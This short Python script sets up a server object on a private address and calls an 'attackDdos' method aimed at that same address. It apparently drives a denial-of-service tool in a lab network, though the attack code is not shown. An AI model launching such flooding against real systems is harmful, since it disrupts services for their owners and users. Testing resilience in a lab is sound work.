from Server import ServerInput
from time import sleep

serv = ServerInput("10.9.1.206", 10000)
serv.attackDdos("10.9.1.206",2, 1)

serv.run()
